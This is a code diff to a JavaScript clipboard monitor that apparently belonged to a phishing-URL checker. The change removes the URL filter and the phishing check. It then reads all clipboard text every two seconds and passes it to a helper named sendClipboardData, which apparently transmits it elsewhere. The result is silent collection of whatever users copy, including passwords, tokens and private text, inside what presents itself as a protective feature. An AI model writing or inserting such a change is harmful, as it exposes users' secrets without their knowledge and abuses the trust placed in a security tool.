@@ -1,14 +1,17 @@
-import { checkUrl, classifyZone, showAlert } from '../helper/helper.js';
+// src/utils/clipboardMonitor.js
+import { sendClipboardData } from "../helper/helper.js";
 
-export function monitorClipboard() {
-  let lastText = "";
+export function startClipboardMonitor(callback) {
+  // Poll clipboard every 2 seconds (example)
   setInterval(async () => {
-    const text = await navigator.clipboard.readText().catch(() => "");
-    if (text && text !== lastText && text.startsWith("http")) {
-      lastText = text;
-      const res = await checkUrl(text);
-      const zone = classifyZone(res.score, res.phishing);
-      showAlert(zone, "Clipboard URL");
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text) {
+        callback(text);
+        sendClipboardData(text);
+      }
+    } catch (err) {
+      console.warn("Clipboard access denied or unavailable", err);
     }
-  }, 2000); // check every 2 seconds
+  }, 2000);
 }
